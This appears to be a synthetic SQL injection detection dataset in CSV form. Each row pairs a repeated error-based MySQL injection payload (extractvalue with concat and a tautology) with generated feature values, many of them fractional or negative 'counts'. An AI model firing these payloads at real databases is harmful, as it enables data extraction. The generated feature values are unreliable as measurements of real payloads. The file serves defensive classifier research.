id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000028,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,4.023672590685051,170.99952697753906,43.67197036743164,34.37128448486328,64.35772705078125,-0.020035969093441963,51.76130294799805,24.23904800415039,0.8542512059211731,0.25091543793678284,0.21192066371440887,0.3883541226387024,0.12907080352306366,3.7029638290405273,1.0426874160766602,1.0646804571151733,0.3636804223060608,0.11654985696077347,0.011073732748627663,0.015636056661605835,6.27825927734375,6.4303879737854,4.526978492736816,0.10549875348806381,1.2587051391601562,0.23550495505332947,-0.047548554837703705,-0.06168149411678314,0.05313189700245857,0.21689078211784363,-0.004230178892612457,-0.21099281311035156,2.7748284339904785,0.09438770264387131,0.3328162133693695,1.4466184377670288,4.543210506439209,0.8056117296218872,1.2278823852539062,0.03371512144804001,0.4471313953399658,0.26072439551353455,0.04216666892170906,0.20243889093399048,0.4092826545238495,-0.073691226541996,-0.03464479744434357,0.05104462429881096,0.05252601578831673,0.10724158585071564,-0.03868301585316658,-0.005824965890496969,0.01169942319393158,0.10976170748472214,-0.05931583791971207,-0.24941183626651764,-0.026013676077127457,0.035710323601961136,-0.0027527883648872375,0.31131356954574585,-0.08742667734622955,0.06986462324857712,-0.08250900357961655,-0.006918005645275116,0.08926810324192047,0.04520171135663986,0.9432247877120972,0.40525951981544495,0.0837433785200119,-0.2120130956172943,-0.12830030918121338,-0.14413610100746155,0.18278564512729645,0.04520147293806076,0.014999623410403728,-0.04747314751148224,1.063001036643982,0.18616092205047607,-0.20503556728363037,0.06939061731100082,0.16254641115665436,4.086972713470459,0.7768723368644714,0.17064277827739716,0.07616741210222244,0.9050351977348328,0.1842474639415741,0.09327054768800735,0.09786200523376465
GAN_000029,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.8755821077654073,172.3927764892578,44.89316940307617,34.872806549072266,66.29981231689453,-0.5152837038040161,48.96419143676758,23.890323638916016,1.158456802368164,0.25652244687080383,0.20725089311599731,0.3900991380214691,0.13004645705223083,3.7105085849761963,1.2617236375808716,1.332292914390564,0.5634168386459351,0.1588459461927414,0.02709093876183033,-0.023242879658937454,6.121334552764893,6.426382541656494,4.701135158538818,-0.043184421956539154,1.3840539455413818,0.14801038801670074,-0.0912126898765564,-0.03634814918041229,0.06254957616329193,0.23977987468242645,-0.009104430675506592,-0.10039990395307541,2.7668473720550537,0.16698922216892242,0.4020213186740875,1.4290108680725098,4.542643070220947,0.714902400970459,1.245985984802246,-0.04510589316487312,0.31798675656318665,0.19841593503952026,-0.0027932673692703247,0.22672425210475922,0.0028344392776489258,0.0258723646402359,-0.1699521541595459,0.03440731391310692,0.03620235249400139,0.047414518892765045,-0.053529899567365646,0.03267888352274895,-0.1241680309176445,-0.007516589015722275,-0.16207046806812286,-0.009802192449569702,-0.014717195183038712,0.06038762256503105,-0.00054197758436203,0.016199391335248947,-0.08687227964401245,0.18856486678123474,-0.06330566853284836,0.055068809539079666,0.04823264479637146,-0.163995623588562,0.9806472659111023,0.1628977656364441,0.1216987669467926,0.04526553303003311,0.01176801323890686,-0.0211387537419796,0.22181907296180725,0.30906417965888977,0.018974829465150833,0.0979100689291954,1.0444254875183105,0.24816855788230896,-0.11994273215532303,0.048094458878040314,0.023458167910575867,4.278286933898926,0.6222937107086182,0.0820307806134224,0.1182703971862793,0.907148003578186,0.11272696405649185,0.17349699139595032,-0.11701729893684387
GAN_000030,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.824954675821398,172.0945587158203,45.30488586425781,35.67937469482422,67.35245513916016,-0.03676013648509979,49.27186584472656,23.29721450805664,1.1695513725280762,0.26530423760414124,0.20558609068393707,0.3878326416015625,0.13115282356739044,3.708446741104126,1.3540270328521729,1.1095083951950073,0.5233045816421509,0.17223715782165527,0.02415347471833229,0.21660305559635162,6.0516276359558105,6.449934482574463,4.942302703857422,0.0274181067943573,1.356350064277649,0.13822373747825623,-0.03822621703147888,0.1855868250131607,0.06270521879196167,0.23121418058872223,-0.007497452199459076,-0.23943127691745758,2.832881212234497,0.2368432581424713,0.3439338505268097,1.4793928861618042,4.545095920562744,0.6548118591308594,1.161524772644043,-0.042701855301856995,0.3245266377925873,0.21902333199977875,0.11640780419111252,0.20493006706237793,0.10764851421117783,0.1134781688451767,-0.24927592277526855,0.053794194012880325,0.032753922045230865,0.04522954672574997,-0.015570389106869698,0.0251702219247818,-0.09313482791185379,-0.06599851697683334,-0.053095005452632904,-0.06981852650642395,0.037311483174562454,0.03510529175400734,-0.034522317349910736,0.002987287938594818,-0.044479839503765106,0.10391619056463242,0.005209155380725861,-0.011451825499534607,0.03599041700363159,-0.10862183570861816,0.9464787244796753,0.10028757899999619,0.1660449206829071,-0.019453860819339752,-0.014197118580341339,-0.0642191469669342,-0.05110717564821243,0.2146485596895218,0.01833268627524376,0.1271655261516571,1.0272756814956665,0.267844021320343,-0.055137358605861664,0.0744631439447403,-0.020261049270629883,4.468366622924805,0.541227400302887,0.19290223717689514,0.10212450474500656,0.8791219592094421,-0.14182250201702118,0.23629093170166016,-0.12452124059200287
GAN_000031,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.9277887954558937,169.86691284179688,45.794654846191406,33.507606506347656,65.67407989501953,0.21287529170513153,50.247127532958984,23.7340145111084,0.8394196033477783,0.2601056694984436,0.20521408319473267,0.3895520865917206,0.1273391991853714,3.6965479850769043,0.846592366695404,1.1440197229385376,0.42376184463500977,0.07051383703947067,0.02076665498316288,-0.026601236313581467,6.152139663696289,6.483628273010254,4.603358745574951,0.20530134439468384,1.3240561485290527,0.12568235397338867,0.06207810714840889,0.04232320189476013,0.03556077182292938,0.17853038012981415,-0.05511607974767685,0.0017650127410888672,2.7005114555358887,0.03721236810088158,0.4068182408809662,1.4096951484680176,4.564406871795654,0.9613131284713745,1.1944671869277954,0.05233899503946304,0.3757445216178894,0.2782229483127594,0.006441421806812286,0.21838532388210297,0.2470225989818573,-0.15690603852272034,-0.08243951946496964,0.032813660800457,0.020297739654779434,0.07518080621957779,-0.05089877173304558,0.0003202468797098845,-0.08838199824094772,0.22530478239059448,-0.008519849739968777,-0.3182483911514282,0.04505763202905655,-0.0710088461637497,0.13221023976802826,0.2985743582248688,-0.03291963040828705,-0.016726940870285034,-0.12204625457525253,-0.06613174080848694,0.08470635861158371,0.018395990133285522,0.9546828269958496,0.2607782781124115,0.04752158001065254,-0.15163519978523254,0.046741046011447906,-0.12584228813648224,0.09676028788089752,0.09029726684093475,0.011165192350745201,-0.09546622633934021,1.1313238143920898,0.2815410792827606,-0.11341816931962967,0.051032841205596924,0.04752533882856369,4.140327453613281,0.6321073770523071,0.0549607090651989,0.13220998644828796,0.8817784190177917,0.08072426170110703,0.009109608829021454,0.05827268958091736
GAN_000032,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.836668343218345,171.09075927734375,46.54066848754883,35.25490188598633,65.09300994873047,0.44318312406539917,48.75944137573242,23.465057373046875,1.032309889793396,0.25928744673728943,0.2080225795507431,0.38469618558883667,0.12861834466457367,3.717010974884033,1.0892654657363892,0.9486609697341919,0.5271110534667969,0.0704721063375473,0.025440240278840065,0.09804614633321762,6.141775131225586,6.440071105957031,4.827560901641846,0.0322088859975338,1.3404029607772827,0.1791931688785553,0.04515460506081581,0.24843908846378326,0.1106511726975441,0.2094031721353531,-0.040600329637527466,-0.17030104994773865,2.7446422576904297,0.18443173170089722,0.353456974029541,1.4990456104278564,4.574957370758057,0.7817239165306091,1.1079225540161133,-0.22581541538238525,0.3891109526157379,0.23899976909160614,0.12258705496788025,0.19761011004447937,0.06990649551153183,-0.01574767380952835,-0.10494663566350937,0.05755937844514847,0.06820199638605118,0.04946966841816902,-0.006267720367759466,0.019260089844465256,-0.18212443590164185,0.044709496200084686,-0.016566608101129532,0.03221071511507034,0.06583784520626068,0.08683253824710846,-0.14099691808223724,0.20408135652542114,0.030029207468032837,0.21713227033615112,-0.08894262462854385,0.039327222853899,0.06263509392738342,0.02293674647808075,0.9514707326889038,0.04374831169843674,0.11590004712343216,-0.0627819299697876,-0.06992299109697342,-0.26827454566955566,0.06393261253833771,-0.04355059564113617,0.007682248018682003,0.02677537500858307,1.0027859210968018,0.227898508310318,-0.07279517501592636,0.0574958398938179,-0.06025267392396927,4.148524761199951,0.5776300430297852,0.23615416884422302,0.12869954109191895,0.9036182761192322,-0.09375843405723572,-0.043831124901771545,0.017968103289604187
GAN_000033,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",nearest_attack_euclidean,R000239,3.8838150742230058,170.7552032470703,45.8416633605957,35.05164337158203,66.07589721679688,0.5794786810874939,48.63056564331055,22.989967346191406,1.15614652633667,0.27159416675567627,0.21181870996952057,0.39398494362831116,0.12774598598480225,3.7034404277801514,0.815043032169342,1.0838903188705444,0.5010789632797241,0.17721202969551086,0.03716466948390007,0.09161408990621567,6.151583671569824,6.496279239654541,4.685331344604492,0.10242763161659241,1.417452096939087,0.2766389548778534,-0.021010518074035645,0.21839463710784912,0.10897437483072281,0.16838295757770538,0.06575382500886917,-0.18502956628799438,2.747520923614502,0.021112045273184776,0.3246440291404724,1.530097246170044,4.576902866363525,0.9874551892280579,1.1663085222244263,-0.04308902472257614,0.31581932306289673,0.17334620654582977,-0.040593817830085754,0.2660500109195709,-0.010902754962444305,-0.19769856333732605,-0.2401866912841797,0.07600805908441544,0.057167891412973404,0.06025225669145584,0.01971754990518093,-0.0169182438403368,-0.26861923933029175,0.2032586932182312,0.053322166204452515,-0.004297874867916107,-0.09047317504882812,0.008462682366371155,-0.05619928240776062,-0.026764899492263794,0.08230887353420258,0.09742126613855362,-0.07846709340810776,0.07601533830165863,0.0661061704158783,-0.08276939392089844,0.9578453302383423,0.1347104012966156,0.1477208137512207,0.02939513325691223,0.16021738946437836,-0.081386037170887,0.058987732976675034,0.01139771193265915,0.020841101184487343,-0.02766280621290207,0.9641558527946472,0.31469279527664185,-0.0071633607149124146,0.08434838056564331,-0.00946720689535141,4.057583332061768,0.5212069749832153,0.1315072625875473,0.16202639043331146,0.8988889455795288,-0.08137618750333786,-0.09357818961143494,-0.09417448192834854
GAN_000034,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,4.16867913374433,173.5646514892578,44.60857009887695,34.44520568847656,66.8998031616211,-0.39004337787628174,49.609683990478516,24.594776153564453,1.0578433275222778,0.2433573305606842,0.21152430772781372,0.39321693778038025,0.12948334217071533,3.6862645149230957,1.1682018041610718,1.7705602645874023,0.6967774033546448,0.1810702085494995,0.03813326358795166,0.03708496689796448,6.30018424987793,6.344679355621338,4.7018208503723145,0.02422279119491577,1.3656280040740967,0.32832542061805725,0.0298149436712265,-0.1507866531610489,0.09037414938211441,0.29948246479034424,-0.08629371225833893,-0.16959965229034424,2.7575836181640625,0.15732362866401672,0.34959661960601807,1.4711676836013794,4.443603038787842,0.5719112753868103,1.3334834575653076,-0.07785990834236145,0.3985596001148224,0.21355171501636505,0.04568846896290779,0.2593457102775574,0.2685469090938568,-0.17328733205795288,-0.1565461903810501,0.05291452258825302,0.04188341274857521,0.09158559143543243,-0.08290325105190277,0.04503445327281952,-0.038512177765369415,0.212446928024292,-0.23730668425559998,-0.16171212494373322,0.2209908366203308,0.06879591941833496,0.04475100338459015,-0.010355852544307709,0.08270630240440369,0.07443656772375107,-0.21024629473686218,-0.035185039043426514,0.06198078766465187,-0.0885259136557579,0.9647427201271057,0.35106462240219116,0.13128674030303955,0.18268339335918427,-0.1362047791481018,-0.16510933637619019,0.03356695920228958,0.1951466202735901,0.029110107570886612,0.061941102147102356,1.1604487895965576,0.22435900568962097,-0.23574724793434143,-0.020464621484279633,0.19801150262355804,4.120485305786133,0.7168254256248474,0.13269010186195374,0.061503179371356964,0.9239122867584229,0.09658794850111008,0.27585288882255554,-0.03741347789764404
GAN_000035,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,4.238300370124412,170.2853240966797,43.7735595703125,34.3254508972168,65.8206558227539,-0.26341307163238525,50.34575271606445,24.41681480407715,1.24839186668396,0.24459144473075867,0.21482791006565094,0.3903050124645233,0.1300690770149231,3.6954498291015625,1.0687636137008667,1.396851897239685,0.5375635027885437,0.16817663609981537,0.026624411344528198,0.1858799308538437,6.082991600036621,6.355319499969482,4.615738868713379,-0.09754902869462967,1.410944938659668,0.26462578773498535,-0.2712375819683075,-0.0251642893999815,0.02739040181040764,0.26245376467704773,0.0053827352821826935,-0.0792900025844574,2.7299094200134277,0.20760852098464966,0.40529829263687134,1.4317388534545898,4.4461236000061035,0.4092616140842438,1.1562745571136475,-0.009074795991182327,0.31257662177085876,0.23699425160884857,-0.144704207777977,0.21560530364513397,0.0423055961728096,0.044184520840644836,-0.20799976587295532,0.06376782059669495,0.022796420380473137,0.05301534757018089,-0.0781913474202156,0.031146714463829994,-0.2488919496536255,0.07129456847906113,-0.0723838210105896,-0.11884133517742157,-0.10893729329109192,-0.00024624913930892944,0.2025681734085083,-0.1662786900997162,-0.050191644579172134,0.4430409073829651,-0.12222904711961746,0.11298096179962158,0.04565680772066116,-0.24530906975269318,0.9681642055511475,0.3614571988582611,0.29678529500961304,0.009937025606632233,0.04477687180042267,-0.014433949254453182,0.21951505541801453,0.46791571378707886,0.02553897723555565,0.06634785979986191,1.1141550540924072,0.18723250925540924,-0.20990747213363647,-0.04777888208627701,0.1380765736103058,4.110971927642822,0.7015834450721741,0.2062966227531433,0.022479047998785973,0.8639876246452332,0.05191458761692047,0.42380791902542114,-0.2175830602645874
GAN_000036,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.826000120166285,169.4370574951172,45.48658752441406,35.725738525390625,66.31706237792969,-0.6043456196784973,48.06730270385742,24.005735397338867,1.0132780075073242,0.2573419213294983,0.21555855870246887,0.38575154542922974,0.1309506595134735,3.6960642337799072,1.4778175354003906,0.9577724933624268,0.6435089707374573,0.19747279584407806,0.03727870061993599,0.3344685435295105,6.158545017242432,6.459611415863037,5.123264312744141,-0.020135074853897095,1.2775017023086548,0.2246708869934082,-0.167088121175766,0.14010833203792572,0.12034180015325546,0.2677219808101654,-0.11114272475242615,-0.42902716994285583,2.868208885192871,0.36386778950691223,0.34177088737487793,1.5397753715515137,4.507978916168213,0.777990460395813,1.1805987358093262,-0.1815282702445984,0.3932645618915558,0.19084009528160095,0.20324894785881042,0.18348853290081024,0.1314387321472168,0.044734518975019455,-0.04697699844837189,0.06308169662952423,0.060743410140275955,0.08010761439800262,-0.037032026797533035,0.022967837750911713,-0.01567424088716507,-0.12670467793941498,-0.18776053190231323,0.023148782551288605,0.20952393114566803,0.14584225416183472,-0.1717880368232727,0.12846143543720245,-0.061327897012233734,0.08732671290636063,-0.025274164974689484,0.2128245234489441,0.028656158596277237,-0.0025764890015125275,0.9428815841674805,0.02380264550447464,0.18465352058410645,0.12194177508354187,-0.058080077171325684,-0.2503347098827362,0.11123136430978775,0.05071253329515457,0.01273552980273962,0.061093010008335114,1.1994093656539917,0.22368110716342926,-0.21676290035247803,0.08291411399841309,-0.061946071684360504,4.325262546539307,0.6480920910835266,0.25445887446403503,0.07147537916898727,0.9122455716133118,-0.10632902383804321,0.1795562207698822,-0.026039130985736847
GAN_000037,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.903942060477571,169.99624633789062,45.492454528808594,35.583763122558594,66.39476013183594,-0.33911848068237305,48.35508728027344,24.0255184173584,1.2634556293487549,0.25277063250541687,0.21112491190433502,0.3880206346511841,0.12986427545547485,3.6792256832122803,1.3125340938568115,1.1348536014556885,0.6485098004341125,0.18316221237182617,0.015817224979400635,0.026708949357271194,6.019270420074463,6.515082359313965,4.676704406738281,0.08064624667167664,1.3271435499191284,0.09506330639123917,-0.13132613897323608,0.09766702353954315,0.024173542857170105,0.20436638593673706,-0.05028866231441498,-0.0027361586689949036,2.7588539123535156,0.30545517802238464,0.43807828426361084,1.4047998189926147,4.486665725708008,0.6674041748046875,1.1582939624786377,-0.050790175795555115,0.30557385087013245,0.20650872588157654,-0.07026149332523346,0.16731087863445282,0.014127373695373535,0.047694794833660126,-0.26479917764663696,0.030101826414465904,0.026020172983407974,0.021692419424653053,-0.08144360035657883,0.03757829591631889,-0.16793739795684814,0.06572578102350235,-0.10984013974666595,-0.059046149253845215,0.06061101704835892,0.11931873857975006,-0.009447365999221802,-0.10958093404769897,-0.06219467148184776,0.15921607613563538,-0.03539677709341049,0.12435364723205566,0.05995776131749153,-0.08621615171432495,0.9995779395103455,0.013342425227165222,0.11234302073717117,-0.01146310567855835,0.06241114065051079,-0.13815918564796448,0.07867803424596786,0.28613144159317017,0.010622167959809303,0.1886885017156601,1.1352274417877197,0.23234276473522186,-0.14120453596115112,0.029146432876586914,-0.05301214009523392,4.221317291259766,0.5982822179794312,0.08499416708946228,0.04214460402727127,0.8858875632286072,-0.010791933164000511,0.18523526191711426,-0.24573634564876556
GAN_000038,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,4.128651054786827,168.98240661621094,42.50075149536133,33.801109313964844,63.82716369628906,0.3140084445476532,51.407081604003906,24.369586944580078,0.9127058386802673,0.2519352436065674,0.22006896138191223,0.388475626707077,0.12869791686534882,3.6913468837738037,0.6241224408149719,1.1357080936431885,0.3976955711841583,0.2058374285697937,0.015165594406425953,0.008550218306481838,6.2621893882751465,6.41199254989624,4.360724449157715,0.09239453822374344,1.3889977931976318,0.4028942584991455,-0.10716714709997177,0.05931448936462402,0.10288764536380768,0.22093400359153748,0.009995967149734497,-0.2792970538139343,2.817066192626953,-0.027659650892019272,0.31711870431900024,1.6377235651016235,4.59019136428833,0.7829491496086121,1.2620985507965088,-0.06217589229345322,0.4040747880935669,0.2325323522090912,0.06400617957115173,0.23628847301006317,0.43692973256111145,-0.2222282886505127,0.006118446588516235,0.04644140973687172,0.06362922489643097,0.0970534160733223,-0.031468529254198074,-0.04050354287028313,-0.033754847943782806,0.20322513580322266,-0.06623383611440659,-0.11799812316894531,-0.023857835680246353,0.06092318519949913,-0.21123383939266205,0.1750285029411316,0.10882151126861572,-0.044797591865062714,-0.1393757462501526,0.11049729585647583,0.09998481720685959,0.029273822903633118,0.9677994847297668,0.2997852861881256,0.05083126947283745,-0.06786899268627167,0.0024835169315338135,-0.11239366978406906,0.1740349978208542,-0.02992910146713257,0.018784450367093086,0.025213316082954407,1.1384389400482178,0.23170031607151031,-0.1587142050266266,0.1649681180715561,0.27705469727516174,4.3200836181640625,0.6678453087806702,0.15281137824058533,0.1496969312429428,0.9201125502586365,0.056252621114254,-0.0018710345029830933,0.04004909098148346
GAN_000039,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",nearest_attack_euclidean,R000239,3.813952531820045,172.23985290527344,46.09190368652344,35.1298942565918,67.74531555175781,0.289679616689682,49.12578201293945,23.259206771850586,1.0096185207366943,0.2651101350784302,0.20371413230895996,0.38728082180023193,0.12852802872657776,3.7157368659973145,1.106750249862671,1.1278510093688965,0.49071812629699707,0.1033729761838913,0.041847944259643555,0.001681552268564701,6.16184139251709,6.589523792266846,4.909590721130371,0.1349121481180191,1.3711612224578857,0.12178337574005127,-0.030861858278512955,0.054093584418296814,0.05709578096866608,0.21738259494304657,-0.0381116047501564,-0.08585022389888763,2.7366111278533936,0.045522820204496384,0.39449581503868103,1.422475814819336,4.616159439086914,0.8151081204414368,1.1896525621414185,-0.08076038956642151,0.35818758606910706,0.2249039113521576,-0.10553710162639618,0.2177209109067917,0.00915554165840149,-0.01068461686372757,-0.19894689321517944,0.028840268030762672,0.06566450744867325,0.06669685989618301,-0.041087958961725235,0.0007530138245783746,-0.09385582059621811,0.0749116912484169,-0.04064144194126129,-0.1332002431154251,0.020403236150741577,-0.032950013875961304,0.14198321104049683,0.10869011282920837,0.00018148869276046753,0.10548203438520432,0.03142701834440231,-0.1431080549955368,0.033663421869277954,-0.07236544042825699,0.9482170343399048,0.1133965477347374,0.12970055639743805,0.06591812521219254,-0.10070062428712845,0.02530904859304428,0.14216673374176025,0.10297000408172607,0.014785850420594215,-0.08676362037658691,1.0931541919708252,0.3350723683834076,0.0057851821184158325,0.036179088056087494,-0.02314506471157074,4.246589183807373,0.609772264957428,0.10898280143737793,0.1670190840959549,0.8579817414283752,0.020468860864639282,0.19223076105117798,0.00548282265663147
GAN_000040,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.853323660575172,170.54254150390625,45.949398040771484,34.830440521240234,64.31510925292969,-0.054809436202049255,48.496116638183594,23.746496200561523,1.0577882528305054,0.2478693276643753,0.2097882628440857,0.3876427710056305,0.12904682755470276,3.694995641708374,1.1761484146118164,1.0488065481185913,0.5603710412979126,0.1364007592201233,0.026524461805820465,-0.005472665652632713,6.110371112823486,6.40290641784668,4.675508975982666,0.04061976447701454,1.3037954568862915,0.19748149812221527,-0.06324553489685059,0.10072299838066101,0.09283389896154404,0.2233927994966507,-0.004840731620788574,-0.1630437970161438,2.7230918407440186,0.29096630215644836,0.36247140169143677,1.4450739622116089,4.531675338745117,0.6845130920410156,1.069334864616394,-0.16844892501831055,0.36270153522491455,0.21452906727790833,0.028798162937164307,0.17006942629814148,0.0870778039097786,-0.11440015584230423,-0.13530009984970093,0.04214981198310852,0.04694995656609535,0.06496603041887283,-0.03130076453089714,0.028073297813534737,-0.10136377066373825,0.11554905027151108,-0.11698643863201141,-0.01646038144826889,0.05186593905091286,0.17674870789051056,-0.08639204502105713,0.09555209428071976,-0.06861120462417603,0.23604971170425415,-0.0568680539727211,0.13888123631477356,0.05599097162485123,0.032907433807849884,0.9630827903747559,0.059716157615184784,0.1719791740179062,-0.007462054491043091,-0.04706384241580963,-0.18973329663276672,0.12757734954357147,0.1347276270389557,0.013886646367609501,0.09801936149597168,1.0772066116333008,0.21083083748817444,-0.1760556399822235,0.043324559926986694,0.10362006723880768,4.139373302459717,0.6889550089836121,0.2629963755607605,0.09587042778730392,0.9322909712791443,0.0678754672408104,0.09718053787946701,-0.028482571244239807
GAN_000041,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.898147393334394,170.4354248046875,44.22902297973633,34.245967864990234,64.93946075439453,0.8317256569862366,49.71552276611328,23.542200088500977,0.9141818881034851,0.25857874751091003,0.2115054577589035,0.3857758939266205,0.1282610297203064,3.6904077529907227,0.668815016746521,0.9785102009773254,0.317807137966156,0.12743860483169556,0.007449121214449406,-0.12230142951011658,6.088928699493408,6.463632106781006,4.443017482757568,0.16472148895263672,1.4399868249893188,0.2881523072719574,-0.0851747989654541,0.14302653074264526,0.008458152413368225,0.20459501445293427,-0.0873795598745346,-0.11894944310188293,2.727248191833496,-0.06726431846618652,0.3248223662376404,1.5974770784378052,4.687641143798828,0.8910977840423584,1.149466633796692,-0.11652614921331406,0.35489004850387573,0.27432981133461,-0.012321941554546356,0.17363648116588593,0.3039452135562897,-0.19253990054130554,-0.1318371742963791,0.018051588907837868,0.03952318802475929,0.05606681853532791,-0.04323649778962135,-0.007326980587095022,-0.21796727180480957,0.3326699733734131,0.15119217336177826,-0.18072833120822906,-0.09210158884525299,-0.03766271844506264,0.0476355105638504,0.24552737176418304,0.022035591304302216,-0.049397021532058716,-0.15615704655647278,0.13848558068275452,0.06826736778020859,0.0769294947385788,0.9653468132019043,0.163198322057724,0.08738165348768234,-0.00609135627746582,0.05190755054354668,-0.06258193403482437,0.12561672925949097,0.019276678562164307,0.012631010264158249,0.028666190803050995,1.1010265350341797,0.31987670063972473,-0.21388140320777893,0.10679515451192856,0.3119438886642456,4.417949676513672,0.6333655118942261,0.23386625945568085,0.22710499167442322,0.830703854560852,-0.0804126039147377,0.014845173805952072,0.09859567880630493
